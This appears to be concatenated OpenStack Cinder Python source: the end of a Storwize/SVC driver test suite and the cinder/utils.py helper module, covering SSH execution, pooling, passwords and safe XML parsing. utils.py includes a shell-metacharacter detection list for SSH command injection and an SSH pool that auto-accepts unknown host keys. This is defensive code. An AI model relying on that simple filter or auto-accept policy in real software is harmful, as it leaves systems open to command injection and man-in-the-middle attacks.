        # Initialize connection from the second volume to the host with no
        # preferred node set if in simulation mode, otherwise, just
        # another initialize connection.
        if self.USESIM:
            self.sim.error_injection('lsvdisk', 'blank_pref_node')
        self.driver.initialize_connection(volume2, self._connector)

        # Try to remove connection from host that doesn't exist (should fail)
        conn_no_exist = self._connector.copy()
        conn_no_exist['initiator'] = 'i_dont_exist'
        conn_no_exist['wwpns'] = ['0000000000000000']
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.terminate_connection,
                          volume1,
                          conn_no_exist)

        # Try to remove connection from volume that isn't mapped (should print
        # message but NOT fail)
        vol_no_exist = {'name': 'i_dont_exist'}
        self.driver.terminate_connection(vol_no_exist, self._connector)

        # Remove the mapping from the 1st volume and delete it
        self.driver.terminate_connection(volume1, self._connector)
        self.driver.delete_volume(volume1)
        self._assert_vol_exists(volume1['name'], False)

        # Make sure our host still exists
        host_name = self.driver._get_host_from_connector(self._connector)
        self.assertNotEqual(host_name, None)

        # Remove the mapping from the 2nd volume and delete it. The host should
        # be automatically removed because there are no more mappings.
        self.driver.terminate_connection(volume2, self._connector)
        self.driver.delete_volume(volume2)
        self._assert_vol_exists(volume2['name'], False)

        # Delete volume types that we created
        for protocol in ['FC', 'iSCSI']:
            volume_types.destroy(ctxt, types[protocol]['id'])

        # Check if our host still exists (it should not)
        if self.USESIM:
            ret = self.driver._get_host_from_connector(self._connector)
            self.assertEqual(ret, None)

    def test_storwize_svc_multi_host_maps(self):
        # We can't test connecting to multiple hosts from a single host when
        # using real storage
        if not self.USESIM:
            return

        # Create a volume to be used in mappings
        ctxt = context.get_admin_context()
        volume = self._generate_vol_info(None, None)
        self.driver.create_volume(volume)

        # Create volume types for protocols
        types = {}
        for protocol in ['FC', 'iSCSI']:
            opts = {'storage_protocol': '<in> ' + protocol}
            types[protocol] = volume_types.create(ctxt, protocol, opts)

        # Create a connector for the second 'host'
        wwpns = [str(random.randint(0, 9999999999999999)).zfill(16),
                 str(random.randint(0, 9999999999999999)).zfill(16)]
        initiator = 'test.initiator.%s' % str(random.randint(10000, 99999))
        conn2 = {'ip': '1.234.56.79',
                 'host': 'storwize-svc-test2',
                 'wwpns': wwpns,
                 'initiator': initiator}

        for protocol in ['FC', 'iSCSI']:
            volume['volume_type_id'] = types[protocol]['id']

            # Make sure that the volume has been created
            self._assert_vol_exists(volume['name'], True)

            self.driver.initialize_connection(volume, self._connector)

            self._set_flag('storwize_svc_multihostmap_enabled', False)
            self.assertRaises(exception.CinderException,
                              self.driver.initialize_connection, volume, conn2)

            self._set_flag('storwize_svc_multihostmap_enabled', True)
            self.driver.initialize_connection(volume, conn2)

            self.driver.terminate_connection(volume, conn2)
            self.driver.terminate_connection(volume, self._connector)

    def test_storwize_svc_delete_volume_snapshots(self):
        # Create a volume with two snapshots
        master = self._generate_vol_info(None, None)
        self.driver.create_volume(master)
        self.driver.db.volume_set(master)

        # Fail creating a snapshot - will force delete the snapshot
        if self.USESIM and False:
            snap = self._generate_vol_info(master['name'], master['id'])
            self.sim.error_injection('startfcmap', 'bad_id')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_snapshot, snap)
            self._assert_vol_exists(snap['name'], False)

        # Delete a snapshot
        snap = self._generate_vol_info(master['name'], master['id'])
        self.driver.create_snapshot(snap)
        self._assert_vol_exists(snap['name'], True)
        self.driver.delete_snapshot(snap)
        self._assert_vol_exists(snap['name'], False)

        # Delete a volume with snapshots (regular)
        snap = self._generate_vol_info(master['name'], master['id'])
        self.driver.create_snapshot(snap)
        self._assert_vol_exists(snap['name'], True)
        self.driver.delete_volume(master)
        self._assert_vol_exists(master['name'], False)

        # Fail create volume from snapshot - will force delete the volume
        if self.USESIM:
            volfs = self._generate_vol_info(None, None)
            self.sim.error_injection('startfcmap', 'bad_id')
            self.sim.error_injection('lsfcmap', 'speed_up')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_volume_from_snapshot,
                              volfs, snap)
            self._assert_vol_exists(volfs['name'], False)

        # Create volume from snapshot and delete it
        volfs = self._generate_vol_info(None, None)
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_volume_from_snapshot(volfs, snap)
        self._assert_vol_exists(volfs['name'], True)
        self.driver.delete_volume(volfs)
        self._assert_vol_exists(volfs['name'], False)

        # Create volume from snapshot and delete the snapshot
        volfs = self._generate_vol_info(None, None)
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_volume_from_snapshot(volfs, snap)
        self.driver.delete_snapshot(snap)
        self._assert_vol_exists(snap['name'], False)

        # Fail create clone - will force delete the target volume
        if self.USESIM:
            clone = self._generate_vol_info(None, None)
            self.sim.error_injection('startfcmap', 'bad_id')
            self.sim.error_injection('lsfcmap', 'speed_up')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_cloned_volume,
                              clone, volfs)
            self._assert_vol_exists(clone['name'], False)

        # Create the clone, delete the source and target
        clone = self._generate_vol_info(None, None)
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_cloned_volume(clone, volfs)
        self._assert_vol_exists(clone['name'], True)
        self.driver.delete_volume(volfs)
        self._assert_vol_exists(volfs['name'], False)
        self.driver.delete_volume(clone)
        self._assert_vol_exists(clone['name'], False)

    # Note defined in python 2.6, so define here...
    def assertLessEqual(self, a, b, msg=None):
        if not a <= b:
            self.fail('%s not less than or equal to %s' % (repr(a), repr(b)))

    def test_storwize_svc_get_volume_stats(self):
        stats = self.driver.get_volume_stats()
        self.assertLessEqual(stats['free_capacity_gb'],
                             stats['total_capacity_gb'])
        if self.USESIM:
            self.assertEqual(stats['volume_backend_name'],
                             'storwize-svc-sim_volpool')
            self.assertAlmostEqual(stats['total_capacity_gb'], 3328.0)
            self.assertAlmostEqual(stats['free_capacity_gb'], 3287.5)

    def test_storwize_svc_extend_volume(self):
        volume = self._generate_vol_info(None, None)
        self.driver.db.volume_set(volume)
        self.driver.create_volume(volume)
        stats = self.driver.extend_volume(volume, '13')
        attrs = self.driver._get_vdisk_attributes(volume['name'])
        vol_size = int(attrs['capacity']) / units.GiB
        self.assertAlmostEqual(vol_size, 13)

        snap = self._generate_vol_info(volume['name'], volume['id'])
        self.driver.create_snapshot(snap)
        self._assert_vol_exists(snap['name'], True)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.extend_volume, volume, '16')

        self.driver.delete_snapshot(snap)
        self.driver.delete_volume(volume)


class CLIResponseTestCase(test.TestCase):
    def test_empty(self):
        self.assertEqual(0, len(storwize_svc.CLIResponse('')))
        self.assertEqual(0, len(storwize_svc.CLIResponse(('', 'stderr'))))

    def test_header(self):
        raw = r'''id!name
1!node1
2!node2
'''
        resp = storwize_svc.CLIResponse(raw, with_header=True)
        self.assertEqual(2, len(resp))
        self.assertEqual('1', resp[0]['id'])
        self.assertEqual('2', resp[1]['id'])

    def test_select(self):
        raw = r'''id!123
name!Bill
name!Bill2
age!30
home address!s1
home address!s2

id! 7
name!John
name!John2
age!40
home address!s3
home address!s4
'''
        resp = storwize_svc.CLIResponse(raw, with_header=False)
        self.assertEqual(list(resp.select('home address', 'name',
                                          'home address')),
                         [('s1', 'Bill', 's1'), ('s2', 'Bill2', 's2'),
                          ('s3', 'John', 's3'), ('s4', 'John2', 's4')])

    def test_lsnode_all(self):
        raw = r'''id!name!UPS_serial_number!WWNN!status
1!node1!!500507680200C744!online
2!node2!!500507680200C745!online
'''
        resp = storwize_svc.CLIResponse(raw)
        self.assertEqual(2, len(resp))
        self.assertEqual('1', resp[0]['id'])
        self.assertEqual('500507680200C744', resp[0]['WWNN'])
        self.assertEqual('2', resp[1]['id'])
        self.assertEqual('500507680200C745', resp[1]['WWNN'])

    def test_lsnode_single(self):
        raw = r'''id!1
port_id!500507680210C744
port_status!active
port_speed!8Gb
port_id!500507680240C744
port_status!inactive
port_speed!8Gb
'''
        resp = storwize_svc.CLIResponse(raw, with_header=False)
        self.assertEqual(1, len(resp))
        self.assertEqual('1', resp[0]['id'])
        self.assertEqual(list(resp.select('port_id', 'port_status')),
                         [('500507680210C744', 'active'),
                          ('500507680240C744', 'inactive')])
/n/n/ncinder/utils.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2010 United States Government as represented by the
# Administrator of the National Aeronautics and Space Administration.
# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

""""""Utilities and helper functions.""""""


import contextlib
import datetime
import functools
import hashlib
import inspect
import os
import paramiko
import pyclbr
import random
import re
import shutil
import sys
import tempfile
import time
from xml.dom import minidom
from xml.parsers import expat
from xml import sax
from xml.sax import expatreader
from xml.sax import saxutils

from eventlet import event
from eventlet import greenthread
from eventlet import pools

from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import importutils
from cinder.openstack.common import lockutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder.openstack.common import timeutils


CONF = cfg.CONF
LOG = logging.getLogger(__name__)
ISO_TIME_FORMAT = ""%Y-%m-%dT%H:%M:%S""
PERFECT_TIME_FORMAT = ""%Y-%m-%dT%H:%M:%S.%f""

synchronized = lockutils.synchronized_with_prefix('cinder-')


def find_config(config_path):
    """"""Find a configuration file using the given hint.

    :param config_path: Full or relative path to the config.
    :returns: Full path of the config, if it exists.
    :raises: `cinder.exception.ConfigNotFound`

    """"""
    possible_locations = [
        config_path,
        os.path.join(CONF.state_path, ""etc"", ""cinder"", config_path),
        os.path.join(CONF.state_path, ""etc"", config_path),
        os.path.join(CONF.state_path, config_path),
        ""/etc/cinder/%s"" % config_path,
    ]

    for path in possible_locations:
        if os.path.exists(path):
            return os.path.abspath(path)

    raise exception.ConfigNotFound(path=os.path.abspath(config_path))


def fetchfile(url, target):
    LOG.debug(_('Fetching %s') % url)
    execute('curl', '--fail', url, '-o', target)


def execute(*cmd, **kwargs):
    """"""Convenience wrapper around oslo's execute() method.""""""
    if 'run_as_root' in kwargs and not 'root_helper' in kwargs:
        kwargs['root_helper'] =\
            'sudo cinder-rootwrap %s' % CONF.rootwrap_config
    try:
        (stdout, stderr) = processutils.execute(*cmd, **kwargs)
    except processutils.ProcessExecutionError as ex:
        raise exception.ProcessExecutionError(
            exit_code=ex.exit_code,
            stderr=ex.stderr,
            stdout=ex.stdout,
            cmd=ex.cmd,
            description=ex.description)
    except processutils.UnknownArgumentError as ex:
        raise exception.Error(ex.message)
    return (stdout, stderr)


def trycmd(*args, **kwargs):
    """"""Convenience wrapper around oslo's trycmd() method.""""""
    if 'run_as_root' in kwargs and not 'root_helper' in kwargs:
        kwargs['root_helper'] =\
            'sudo cinder-rootwrap %s' % CONF.rootwrap_config
    try:
        (stdout, stderr) = processutils.trycmd(*args, **kwargs)
    except processutils.ProcessExecutionError as ex:
        raise exception.ProcessExecutionError(
            exit_code=ex.exit_code,
            stderr=ex.stderr,
            stdout=ex.stdout,
            cmd=ex.cmd,
            description=ex.description)
    except processutils.UnknownArgumentError as ex:
        raise exception.Error(ex.message)
    return (stdout, stderr)


def check_ssh_injection(cmd_list):
    ssh_injection_pattern = ['`', '$', '|', '||', ';', '&', '&&', '>', '>>',
                             '<']

    # Check whether injection attacks exist
    for arg in cmd_list:
        arg = arg.strip()
        # First, check no space in the middle of arg
        arg_len = len(arg.split())
        if arg_len > 1:
            raise exception.SSHInjectionThreat(command=str(cmd_list))

        # Second, check whether danger character in command. So the shell
        # special operator must be a single argument.
        for c in ssh_injection_pattern:
            if arg == c:
                continue

            result = arg.find(c)
            if not result == -1:
                if result == 0 or not arg[result - 1] == '\\':
                    raise exception.SSHInjectionThreat(command=cmd_list)


def ssh_execute(ssh, cmd, process_input=None,
                addl_env=None, check_exit_code=True):
    LOG.debug(_('Running cmd (SSH): %s'), cmd)
    if addl_env:
        raise exception.Error(_('Environment not supported over SSH'))

    if process_input:
        # This is (probably) fixable if we need it...
        raise exception.Error(_('process_input not supported over SSH'))

    stdin_stream, stdout_stream, stderr_stream = ssh.exec_command(cmd)
    channel = stdout_stream.channel

    #stdin.write('process_input would go here')
    #stdin.flush()

    # NOTE(justinsb): This seems suspicious...
    # ...other SSH clients have buffering issues with this approach
    stdout = stdout_stream.read()
    stderr = stderr_stream.read()
    stdin_stream.close()
    stdout_stream.close()
    stderr_stream.close()

    exit_status = channel.recv_exit_status()

    # exit_status == -1 if no exit code was returned
    if exit_status != -1:
        LOG.debug(_('Result was %s') % exit_status)
        if check_exit_code and exit_status != 0:
            raise exception.ProcessExecutionError(exit_code=exit_status,
                                                  stdout=stdout,
                                                  stderr=stderr,
                                                  cmd=cmd)
    channel.close()
    return (stdout, stderr)


def create_channel(client, width, height):
    """"""Invoke an interactive shell session on server.""""""
    channel = client.invoke_shell()
    channel.resize_pty(width, height)
    return channel


class SSHPool(pools.Pool):
    """"""A simple eventlet pool to hold ssh connections.""""""

    def __init__(self, ip, port, conn_timeout, login, password=None,
                 privatekey=None, *args, **kwargs):
        self.ip = ip
        self.port = port
        self.login = login
        self.password = password
        self.conn_timeout = conn_timeout if conn_timeout else None
        self.privatekey = privatekey
        super(SSHPool, self).__init__(*args, **kwargs)

    def create(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if self.password:
                ssh.connect(self.ip,
                            port=self.port,
                            username=self.login,
                            password=self.password,
                            timeout=self.conn_timeout)
            elif self.privatekey:
                pkfile = os.path.expanduser(self.privatekey)
                privatekey = paramiko.RSAKey.from_private_key_file(pkfile)
                ssh.connect(self.ip,
                            port=self.port,
                            username=self.login,
                            pkey=privatekey,
                            timeout=self.conn_timeout)
            else:
                msg = _(""Specify a password or private_key"")
                raise exception.CinderException(msg)

            # Paramiko by default sets the socket timeout to 0.1 seconds,
            # ignoring what we set thru the sshclient. This doesn't help for
            # keeping long lived connections. Hence we have to bypass it, by
            # overriding it after the transport is initialized. We are setting
            # the sockettimeout to None and setting a keepalive packet so that,
            # the server will keep the connection open. All that does is send
            # a keepalive packet every ssh_conn_timeout seconds.
            if self.conn_timeout:
                transport = ssh.get_transport()
                transport.sock.settimeout(None)
                transport.set_keepalive(self.conn_timeout)
            return ssh
        except Exception as e:
            msg = _(""Error connecting via ssh: %s"") % e
            LOG.error(msg)
            raise paramiko.SSHException(msg)

    def get(self):
        """"""
        Return an item from the pool, when one is available.  This may
        cause the calling greenthread to block. Check if a connection is active
        before returning it. For dead connections create and return a new
        connection.
        """"""
        conn = super(SSHPool, self).get()
        if conn:
            if conn.get_transport().is_active():
                return conn
            else:
                conn.close()
        return self.create()

    def remove(self, ssh):
        """"""Close an ssh client and remove it from free_items.""""""
        ssh.close()
        ssh = None
        if ssh in self.free_items:
            self.free_items.pop(ssh)
        if self.current_size > 0:
            self.current_size -= 1


def cinderdir():
    import cinder
    return os.path.abspath(cinder.__file__).split('cinder/__init__.py')[0]


def debug(arg):
    LOG.debug(_('debug in callback: %s'), arg)
    return arg


def generate_uid(topic, size=8):
    characters = '01234567890abcdefghijklmnopqrstuvwxyz'
    choices = [random.choice(characters) for x in xrange(size)]
    return '%s-%s' % (topic, ''.join(choices))


# Default symbols to use for passwords. Avoids visually confusing characters.
# ~6 bits per symbol
DEFAULT_PASSWORD_SYMBOLS = ('23456789',  # Removed: 0,1
                            'ABCDEFGHJKLMNPQRSTUVWXYZ',   # Removed: I, O
                            'abcdefghijkmnopqrstuvwxyz')  # Removed: l


# ~5 bits per symbol
EASIER_PASSWORD_SYMBOLS = ('23456789',  # Removed: 0, 1
                           'ABCDEFGHJKLMNPQRSTUVWXYZ')  # Removed: I, O


def last_completed_audit_period(unit=None):
    """"""This method gives you the most recently *completed* audit period.

    arguments:
            units: string, one of 'hour', 'day', 'month', 'year'
                    Periods normally begin at the beginning (UTC) of the
                    period unit (So a 'day' period begins at midnight UTC,
                    a 'month' unit on the 1st, a 'year' on Jan, 1)
                    unit string may be appended with an optional offset
                    like so:  'day@18'  This will begin the period at 18:00
                    UTC.  'month@15' starts a monthly period on the 15th,
                    and year@3 begins a yearly one on March 1st.


    returns:  2 tuple of datetimes (begin, end)
              The begin timestamp of this audit period is the same as the
              end of the previous.
    """"""
    if not unit:
        unit = CONF.volume_usage_audit_period

    offset = 0
    if '@' in unit:
        unit, offset = unit.split(""@"", 1)
        offset = int(offset)

    rightnow = timeutils.utcnow()
    if unit not in ('month', 'day', 'year', 'hour'):
        raise ValueError('Time period must be hour, day, month or year')
    if unit == 'month':
        if offset == 0:
            offset = 1
        end = datetime.datetime(day=offset,
                                month=rightnow.month,
                                year=rightnow.year)
        if end >= rightnow:
            year = rightnow.year
            if 1 >= rightnow.month:
                year -= 1
                month = 12 + (rightnow.month - 1)
            else:
                month = rightnow.month - 1
            end = datetime.datetime(day=offset,
                                    month=month,
                                    year=year)
        year = end.year
        if 1 >= end.month:
            year -= 1
            month = 12 + (end.month - 1)
        else:
            month = end.month - 1
        begin = datetime.datetime(day=offset, month=month, year=year)

    elif unit == 'year':
        if offset == 0:
            offset = 1
        end = datetime.datetime(day=1, month=offset, year=rightnow.year)
        if end >= rightnow:
            end = datetime.datetime(day=1,
                                    month=offset,
                                    year=rightnow.year - 1)
            begin = datetime.datetime(day=1,
                                      month=offset,
                                      year=rightnow.year - 2)
        else:
            begin = datetime.datetime(day=1,
                                      month=offset,
                                      year=rightnow.year - 1)

    elif unit == 'day':
        end = datetime.datetime(hour=offset,
                                day=rightnow.day,
                                month=rightnow.month,
                                year=rightnow.year)
        if end >= rightnow:
            end = end - datetime.timedelta(days=1)
        begin = end - datetime.timedelta(days=1)

    elif unit == 'hour':
        end = rightnow.replace(minute=offset, second=0, microsecond=0)
        if end >= rightnow:
            end = end - datetime.timedelta(hours=1)
        begin = end - datetime.timedelta(hours=1)

    return (begin, end)


def generate_password(length=20, symbolgroups=DEFAULT_PASSWORD_SYMBOLS):
    """"""Generate a random password from the supplied symbol groups.

    At least one symbol from each group will be included. Unpredictable
    results if length is less than the number of symbol groups.

    Believed to be reasonably secure (with a reasonable password length!)

    """"""
    r = random.SystemRandom()

    # NOTE(jerdfelt): Some password policies require at least one character
    # from each group of symbols, so start off with one random character
    # from each symbol group
    password = [r.choice(s) for s in symbolgroups]
    # If length < len(symbolgroups), the leading characters will only
    # be from the first length groups. Try our best to not be predictable
    # by shuffling and then truncating.
    r.shuffle(password)
    password = password[:length]
    length -= len(password)

    # then fill with random characters from all symbol groups
    symbols = ''.join(symbolgroups)
    password.extend([r.choice(symbols) for _i in xrange(length)])

    # finally shuffle to ensure first x characters aren't from a
    # predictable group
    r.shuffle(password)

    return ''.join(password)


def generate_username(length=20, symbolgroups=DEFAULT_PASSWORD_SYMBOLS):
    # Use the same implementation as the password generation.
    return generate_password(length, symbolgroups)


def last_octet(address):
    return int(address.split('.')[-1])


def get_my_linklocal(interface):
    try:
        if_str = execute('ip', '-f', 'inet6', '-o', 'addr', 'show', interface)
        condition = '\s+inet6\s+([0-9a-f:]+)/\d+\s+scope\s+link'
        links = [re.search(condition, x) for x in if_str[0].split('\n')]
        address = [w.group(1) for w in links if w is not None]
        if address[0] is not None:
            return address[0]
        else:
            raise exception.Error(_('Link Local address is not found.:%s')
                                  % if_str)
    except Exception as ex:
        raise exception.Error(_(""Couldn't get Link Local IP of %(interface)s""
                                "" :%(ex)s"") %
                              {'interface': interface, 'ex': ex, })


def parse_mailmap(mailmap='.mailmap'):
    mapping = {}
    if os.path.exists(mailmap):
        fp = open(mailmap, 'r')
        for l in fp:
            l = l.strip()
            if not l.startswith('#') and ' ' in l:
                canonical_email, alias = l.split(' ')
                mapping[alias.lower()] = canonical_email.lower()
    return mapping


def str_dict_replace(s, mapping):
    for s1, s2 in mapping.iteritems():
        s = s.replace(s1, s2)
    return s


class LazyPluggable(object):
    """"""A pluggable backend loaded lazily based on some value.""""""

    def __init__(self, pivot, **backends):
        self.__backends = backends
        self.__pivot = pivot
        self.__backend = None

    def __get_backend(self):
        if not self.__backend:
            backend_name = CONF[self.__pivot]
            if backend_name not in self.__backends:
                raise exception.Error(_('Invalid backend: %s') % backend_name)

            backend = self.__backends[backend_name]
            if isinstance(backend, tuple):
                name = backend[0]
                fromlist = backend[1]
            else:
                name = backend
                fromlist = backend

            self.__backend = __import__(name, None, None, fromlist)
            LOG.debug(_('backend %s'), self.__backend)
        return self.__backend

    def __getattr__(self, key):
        backend = self.__get_backend()
        return getattr(backend, key)


class LoopingCallDone(Exception):
    """"""Exception to break out and stop a LoopingCall.

    The poll-function passed to LoopingCall can raise this exception to
    break out of the loop normally. This is somewhat analogous to
    StopIteration.

    An optional return-value can be included as the argument to the exception;
    this return-value will be returned by LoopingCall.wait()

    """"""

    def __init__(self, retvalue=True):
        """""":param retvalue: Value that LoopingCall.wait() should return.""""""
        self.retvalue = retvalue


class LoopingCall(object):
    def __init__(self, f=None, *args, **kw):
        self.args = args
        self.kw = kw
        self.f = f
        self._running = False

    def start(self, interval, initial_delay=None):
        self._running = True
        done = event.Event()

        def _inner():
            if initial_delay:
                greenthread.sleep(initial_delay)

            try:
                while self._running:
                    self.f(*self.args, **self.kw)
                    if not self._running:
                        break
                    greenthread.sleep(interval)
            except LoopingCallDone as e:
                self.stop()
                done.send(e.retvalue)
            except Exception:
                LOG.exception(_('in looping call'))
                done.send_exception(*sys.exc_info())
                return
            else:
                done.send(True)

        self.done = done

        greenthread.spawn(_inner)
        return self.done

    def stop(self):
        self._running = False

    def wait(self):
        return self.done.wait()


class ProtectedExpatParser(expatreader.ExpatParser):
    """"""An expat parser which disables DTD's and entities by default.""""""

    def __init__(self, forbid_dtd=True, forbid_entities=True,
                 *args, **kwargs):
        # Python 2.x old style class
        expatreader.ExpatParser.__init__(self, *args, **kwargs)
        self.forbid_dtd = forbid_dtd
        self.forbid_entities = forbid_entities

    def start_doctype_decl(self, name, sysid, pubid, has_internal_subset):
        raise ValueError(""Inline DTD forbidden"")

    def entity_decl(self, entityName, is_parameter_entity, value, base,
                    systemId, publicId, notationName):
        raise ValueError(""<!ENTITY> forbidden"")

    def unparsed_entity_decl(self, name, base, sysid, pubid, notation_name):
        # expat 1.2
        raise ValueError(""<!ENTITY> forbidden"")

    def reset(self):
        expatreader.ExpatParser.reset(self)
        if self.forbid_dtd:
            self._parser.StartDoctypeDeclHandler = self.start_doctype_decl
        if self.forbid_entities:
            self._parser.EntityDeclHandler = self.entity_decl
            self._parser.UnparsedEntityDeclHandler = self.unparsed_entity_decl


def safe_minidom_parse_string(xml_string):
    """"""Parse an XML string using minidom safely.

    """"""
    try:
        return minidom.parseString(xml_string, parser=ProtectedExpatParser())
    except sax.SAXParseException as se:
        raise expat.ExpatError()


def xhtml_escape(value):
    """"""Escapes a string so it is valid within XML or XHTML.

    """"""
    return saxutils.escape(value, {'""': '&quot;', ""'"": '&apos;'})


def utf8(value):
    """"""Try to turn a string into utf-8 if possible.

    """"""
    if isinstance(value, unicode):
        return value.encode('utf-8')
    elif isinstance(value, str):
        return value
    else:
        raise ValueError(""%s is not a string"" % value)


def get_from_path(items, path):
    """"""Returns a list of items matching the specified path.

    Takes an XPath-like expression e.g. prop1/prop2/prop3, and for each item
    in items, looks up items[prop1][prop2][prop3]. Like XPath, if any of the
    intermediate results are lists it will treat each list item individually.
    A 'None' in items or any child expressions will be ignored, this function
    will not throw because of None (anywhere) in items.  The returned list
    will contain no None values.

    """"""
    if path is None:
        raise exception.Error('Invalid mini_xpath')

    (first_token, sep, remainder) = path.partition('/')

    if first_token == '':
        raise exception.Error('Invalid mini_xpath')

    results = []

    if items is None:
        return results

    if not isinstance(items, list):
        # Wrap single objects in a list
        items = [items]

    for item in items:
        if item is None:
            continue
        get_method = getattr(item, 'get', None)
        if get_method is None:
            continue
        child = get_method(first_token)
        if child is None:
            continue
        if isinstance(child, list):
            # Flatten intermediate lists
            for x in child:
                results.append(x)
        else:
            results.append(child)

    if not sep:
        # No more tokens
        return results
    else:
        return get_from_path(results, remainder)


def flatten_dict(dict_, flattened=None):
    """"""Recursively flatten a nested dictionary.""""""
    flattened = flattened or {}
    for key, value in dict_.iteritems():
        if hasattr(value, 'iteritems'):
            flatten_dict(value, flattened)
        else:
            flattened[key] = value
    return flattened


def partition_dict(dict_, keys):
    """"""Return two dicts, one with `keys` the other with everything else.""""""
    intersection = {}
    difference = {}
    for key, value in dict_.iteritems():
        if key in keys:
            intersection[key] = value
        else:
            difference[key] = value
    return intersection, difference


def map_dict_keys(dict_, key_map):
    """"""Return a dict in which the dictionaries keys are mapped to new keys.""""""
    mapped = {}
    for key, value in dict_.iteritems():
        mapped_key = key_map[key] if key in key_map else key
        mapped[mapped_key] = value
    return mapped


def subset_dict(dict_, keys):
    """"""Return a dict that only contains a subset of keys.""""""
    subset = partition_dict(dict_, keys)[0]
    return subset


def check_isinstance(obj, cls):
    """"""Checks that obj is of type cls, and lets PyLint infer types.""""""
    if isinstance(obj, cls):
        return obj
    raise Exception(_('Expected object of type: %s') % (str(cls)))
    # TODO(justinsb): Can we make this better??
    return cls()  # Ugly PyLint hack


def is_valid_boolstr(val):
    """"""Check if the provided string is a valid bool string or not.""""""
    val = str(val).lower()
    return (val == 'true' or val == 'false' or
            val == 'yes' or val == 'no' or
            val == 'y' or val == 'n' or
            val == '1' or val == '0')


def is_valid_ipv4(address):
    """"""valid the address strictly as per format xxx.xxx.xxx.xxx.
    where xxx is a value between 0 and 255.
    """"""
    parts = address.split(""."")
    if len(parts) != 4:
        return False
    for item in parts:
        try:
            if not 0 <= int(item) <= 255:
                return False
        except ValueError:
            return False
    return True


def monkey_patch():
    """"""If the CONF.monkey_patch set as True,
    this function patches a decorator
    for all functions in specified modules.

    You can set decorators for each modules
    using CONF.monkey_patch_modules.
    The format is ""Module path:Decorator function"".
    Example: 'cinder.api.ec2.cloud:' \
     cinder.openstack.common.notifier.api.notify_decorator'

    Parameters of the decorator is as follows.
    (See cinder.openstack.common.notifier.api.notify_decorator)

    name - name of the function
    function - object of the function
    """"""
    # If CONF.monkey_patch is not True, this function do nothing.
    if not CONF.monkey_patch:
        return
    # Get list of modules and decorators
    for module_and_decorator in CONF.monkey_patch_modules:
        module, decorator_name = module_and_decorator.split(':')
        # import decorator function
        decorator = importutils.import_class(decorator_name)
        __import__(module)
        # Retrieve module information using pyclbr
        module_data = pyclbr.readmodule_ex(module)
        for key in module_data.keys():
            # set the decorator for the class methods
            if isinstance(module_data[key], pyclbr.Class):
                clz = importutils.import_class(""%s.%s"" % (module, key))
                for method, func in inspect.getmembers(clz, inspect.ismethod):
                    setattr(
                        clz, method,
                        decorator(""%s.%s.%s"" % (module, key, method), func))
            # set the decorator for the function
            if isinstance(module_data[key], pyclbr.Function):
                func = importutils.import_class(""%s.%s"" % (module, key))
                setattr(sys.modules[module], key,
                        decorator(""%s.%s"" % (module, key), func))


def convert_to_list_dict(lst, label):
    """"""Convert a value or list into a list of dicts""""""
    if not lst:
        return None
    if not isinstance(lst, list):
        lst = [lst]
    return [{label: x} for x in lst]


def timefunc(func):
    """"""Decorator that logs how long a particular function took to execute""""""
    @functools.wraps(func)
    def inner(*args, **kwargs):
        start_time = time.time()
        try:
            return func(*args, **kwargs)
        finally:
            total_time = time.time() - start_time
            LOG.debug(_(""timefunc: '%(name)s' took %(total_time).2f secs"") %
                      dict(name=func.__name__, total_time=total_time))
    return inner


def generate_glance_url():
    """"""Generate the URL to glance.""""""
    # TODO(jk0): This will eventually need to take SSL into consideration
    # when supported in glance.
    return ""http://%s:%d"" % (CONF.glance_host, CONF.glance_port)


@contextlib.contextmanager
def logging_error(message):
    """"""Catches exception, write message to the log, re-raise.
    This is a common refinement of save_and_reraise that writes a specific
    message to the log.
    """"""
    try:
        yield
    except Exception as error:
        with excutils.save_and_reraise_exception():
            LOG.exception(message)


def make_dev_path(dev, partition=None, base='/dev'):
    """"""Return a path to a particular device.

    >>> make_dev_path('xvdc')
    /dev/xvdc

    >>> make_dev_path('xvdc', 1)
    /dev/xvdc1
    """"""
    path = os.path.join(base, dev)
    if partition:
        path += str(partition)
    return path


def total_seconds(td):
    """"""Local total_seconds implementation for compatibility with python 2.6""""""
    if hasattr(td, 'total_seconds'):
        return td.total_seconds()
    else:
        return ((td.days * 86400 + td.seconds) * 10 ** 6 +
                td.microseconds) / 10.0 ** 6


def sanitize_hostname(hostname):
    """"""Return a hostname which conforms to RFC-952 and RFC-1123 specs.""""""
    if isinstance(hostname, unicode):
        hostname = hostname.encode('latin-1', 'ignore')

    hostname = re.sub('[ _]', '-', hostname)
    hostname = re.sub('[^\w.-]+', '', hostname)
    hostname = hostname.lower()
    hostname = hostname.strip('.-')

    return hostname


def read_cached_file(filename, cache_info, reload_func=None):
    """"""Read from a file if it has been modified.

    :param cache_info: dictionary to hold opaque cache.
    :param reload_func: optional function to be called with data when
                        file is reloaded due to a modification.

    :returns: data from file

    """"""
    mtime = os.path.getmtime(filename)
    if not cache_info or mtime != cache_info.get('mtime'):
        with open(filename) as fap:
            cache_info['data'] = fap.read()
        cache_info['mtime'] = mtime
        if reload_func:
            reload_func(cache_info['data'])
    return cache_info['data']


def hash_file(file_like_object):
    """"""Generate a hash for the contents of a file.""""""
    checksum = hashlib.sha1()
    any(map(checksum.update, iter(lambda: file_like_object.read(32768), '')))
    return checksum.hexdigest()


@contextlib.contextmanager
def temporary_mutation(obj, **kwargs):
